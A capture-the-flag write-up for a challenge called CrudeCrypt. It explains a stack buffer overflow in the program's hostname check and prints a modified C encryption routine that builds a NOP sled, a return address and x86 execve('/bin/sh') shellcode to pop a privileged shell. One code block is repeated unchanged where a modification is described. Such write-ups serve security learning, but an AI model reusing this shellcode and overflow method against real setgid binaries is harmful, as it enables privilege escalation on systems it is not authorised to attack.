# Crudecrypt

## Problem
Without proper maintainers, development of Truecrypt has stopped! CrudeCrypt has emerged as a notable alternative in the open source community. 
The author has promised it is 'secure' but we know better than that. Take a look at the code and read the contents of flag.txt from the server! 
The problem is at `/home/crudecrypt/crude_crypt` on the shell server.

## Writeup
crude_crypt.c takes three arguments **encrypt|decrypt input_path output_path**. There is a function pointer which points to appropriate function based on the input (encrypt or decrypt).
Also encrypt action elevates the privilege of the binary using `setegid`. It asks for a password, hashes it and sends the digest to either of the functions (encrypt or decrypt).

I took a look at the `encrypt_file` function. It takes 3 inputs, raw_file, enc_file and key which is the digest of the password supplied.
It then calculates the size of the file, adds size of the header, and creates a padded block which a nice next multiple of 16. It then calls `init_file_header` which takes in a pointer 
to a file_header struct and file size and creates a file header. This function initializes two out of three fields of the `file_header` struct namely, the size and a constant `MAGIC`.
The third field, a char buffer containing host length is initialized by `safe_gethostname`. It then mem-copies the file_header and then appends raw_file to it. Then the control is 
passed to encrypt_buffer which does standard AES encryption. *Nothing fishy in there.*

````
void encrypt_file(FILE* raw_file, FILE* enc_file, unsigned char* key) {
    int size = file_size(raw_file);
    size_t block_size = MULT_BLOCK_SIZE(sizeof(file_header) + size);
    char* padded_block = calloc(1, block_size);

    file_header header;
    init_file_header(&header, size);
    safe_gethostname(header.host, HOST_LEN);

    memcpy(padded_block, &header, sizeof(file_header));
    fread(padded_block + sizeof(file_header), 1, size, raw_file);

    if(encrypt_buffer(padded_block, block_size, (char*)key, 16) != 0) {
        printf("There was an error encrypting the file!\n");
        return;
    }

    printf("=> Encrypted file successfully\n");
    fwrite(padded_block, 1, block_size, enc_file);

    free(padded_block);
}
````

The `decrypt_file` is also written in a similar way except that it reads the file_header, checks if the header is tampered by comparing it with the constant value MAGIC,
checks if the file is encrypted using current machine, and then passes the remaining file for decryption.

Since encryption was setting the gid, I assumed that there has to be some flaw during encryption. 

The HINT said **You can never trust user input**.

Since the contents of the input file we give is directly read and encrypted, nothing was fishy there. I started to think if I can mess up the header and what may happen after that.
The function checking the header during decryption is `check_hostname`. It copies the header present in the file to a buffer of size HOST_LEN which is 32 bytes. On a closer look,
it actually copies `strlen(header->host)` number of bytes. But the header->host field is being set by `safe_gethostname` function. *If only there was a way to set the hostname of our 
choosing.*

***Buffer Overflow detected!!!***

I modified the source of crude_crypt.c and compiled it. I modified the function encrypt_file.

````
void encrypt_file(FILE* raw_file, FILE* enc_file, unsigned char* key) {
    int size = file_size(raw_file);
    size_t block_size = MULT_BLOCK_SIZE(sizeof(file_header) + size);
    char* padded_block = calloc(1, block_size);

    file_header header;
    init_file_header(&header, size);
    safe_gethostname(header.host, HOST_LEN);

    memcpy(padded_block, &header, sizeof(file_header));
    fread(padded_block + sizeof(file_header), 1, size, raw_file);

    if(encrypt_buffer(padded_block, block_size, (char*)key, 16) != 0) {
        printf("There was an error encrypting the file!\n");
        return;
    }

    printf("=> Encrypted file successfully\n");
    fwrite(padded_block, 1, block_size, enc_file);

    free(padded_block);
}
````
I changed the call to `safe_gethostname` to a call to `strcpy(header.host, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");` I then encrypted a file using this gloriously causing a
segmentation fault. Then I realized that HOST_LEN was 32 bytes as defined in the MACRO. I went ahead and changed it to 128 bytes and then recompiled it. 
This encrypted fine but decryption caused it to return to 0x61616161. Now all I had to do was find the return address, and construct the exploit string and "strcpy" it to header.host.

The new `encrypt_file` looks like 

````
void encrypt_file(FILE* raw_file, FILE* enc_file, unsigned char* key) {
    int size = file_size(raw_file);
    size_t block_size = MULT_BLOCK_SIZE(sizeof(file_header) + size);
    char* padded_block = calloc(1, block_size);

    file_header header;
    init_file_header(&header, size);
    
	//safe_gethostname(header.host, HOST_LEN);
    char nop[] = "\x90\x90\x90\x90";
    strcpy(header.host, nop);
    strcat(header.host, nop);
    strcat(header.host, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
    //strcat(header.host, exp);
    strcat(header.host, "aa");
    char ret[] = {0x20, 0xd6, 0xff, 0xff};
    strcat(header.host, ret);
    //strcat(header.host, "FFFF");
    strcat(header.host, nop);
    strcat(header.host, nop);
    strcat(header.host, nop);
    strcat(header.host, nop);
    strcat(header.host, nop);
    strcat(header.host, nop);
    strcat(header.host, nop);
    strcat(header.host, nop);
    strcat(header.host, nop);
    strcat(header.host, exp);

    memcpy(padded_block, &header, sizeof(file_header));
    fread(padded_block + sizeof(file_header), 1, size, raw_file);

    if(encrypt_buffer(padded_block, block_size, (char*)key, 16) != 0) {
        printf("There was an error encrypting the file!\n");
        return;
    }

    printf("=> Encrypted file successfully\n");
    fwrite(padded_block, 1, block_size, enc_file);

    free(padded_block);
}
````
Sorry for the "nop's" I felt lazy to write it properly.

I also added the global variable for exploit string since adding a local variable was interfering other instructions on the stack.
`char exp[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";`

I then encrypted it like

`./test encrypt in.txt mod.txt`

and used the original binary to decrypt
`./crude_crypt mod.txt dec.txt` which gave me an awesome shell

**FLAG: writing_software_is_hard**

CAUTION: GDB adds its own environment variables on the stack causing the addresses to be different by some offset.
NOTE: The exploit string was getting overwritten by itself, so I put it as a global variable and hence it will be in the data section.

